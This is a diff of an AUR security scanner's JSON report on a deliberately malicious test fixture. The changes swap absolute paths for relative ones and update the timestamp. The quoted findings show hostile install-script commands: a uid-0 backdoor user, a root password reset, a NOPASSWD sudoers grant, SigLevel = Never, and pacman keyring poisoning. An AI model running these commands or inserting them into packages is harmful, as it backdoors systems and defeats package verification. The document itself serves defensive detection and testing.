@@ -9,7 +9,7 @@
       "title": "Privileged account manipulation (install script)",
       "description": "Creates or elevates an account to uid 0 / the wheel or sudo group — a backdoor-admin pattern.",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/trust-tamper/sysprep.install",
+        "file": "tests/fixtures/malicious/trust-tamper/sysprep.install",
         "line": 2,
         "column": 3,
         "snippet": "  useradd -ou 0 -g 0 backdoor"
@@ -28,7 +28,7 @@
       "title": "Password manipulation (install script)",
       "description": "Sets, resets, or clears an account password (chpasswd / passwd -d / piped passwd).",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/trust-tamper/sysprep.install",
+        "file": "tests/fixtures/malicious/trust-tamper/sysprep.install",
         "line": 6,
         "column": 26,
         "snippet": "  echo 'root:evilpass' | chpasswd"
@@ -47,7 +47,7 @@
       "title": "doas/sudoers nopasswd grant (install script)",
       "description": "Grants passwordless privilege via /etc/doas.conf or a NOPASSWD sudoers rule.",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/trust-tamper/sysprep.install",
+        "file": "tests/fixtures/malicious/trust-tamper/sysprep.install",
         "line": 3,
         "column": 28,
         "snippet": "  echo 'backdoor ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/backdoor"
@@ -66,7 +66,7 @@
       "title": "pacman signature downgrade (install script)",
       "description": "Sets SigLevel = Never in /etc/pacman.conf, disabling package signature verification so future malicious updates are accepted silently.",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/trust-tamper/sysprep.install",
+        "file": "tests/fixtures/malicious/trust-tamper/sysprep.install",
         "line": 5,
         "column": 25,
         "snippet": "  sed -i 's/^SigLevel.*/SigLevel = Never/' /etc/pacman.conf"
@@ -85,7 +85,7 @@
       "title": "pacman keyring poisoning (install script)",
       "description": "Imports and locally-signs an arbitrary key into pacman's trust store (pacman-key --recv-keys/--lsign) so attacker-signed packages are accepted.",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/trust-tamper/sysprep.install",
+        "file": "tests/fixtures/malicious/trust-tamper/sysprep.install",
         "line": 4,
         "column": 3,
         "snippet": "  pacman-key --recv-keys DEADBEEFDEADBEEF && pacman-key --lsign-key DEADBEEFDEADBEEF"
@@ -99,9 +99,9 @@
     }
   ],
   "scanned_files": [
-    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/trust-tamper/PKGBUILD",
-    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/trust-tamper/sysprep.install"
+    "tests/fixtures/malicious/trust-tamper/PKGBUILD",
+    "tests/fixtures/malicious/trust-tamper/sysprep.install"
   ],
-  "timestamp": "2026-06-15T01:57:17.417779984Z",
-  "scan_duration_ms": 2
+  "timestamp": "2026-06-15T10:43:31.320539089Z",
+  "scan_duration_ms": 5
 }
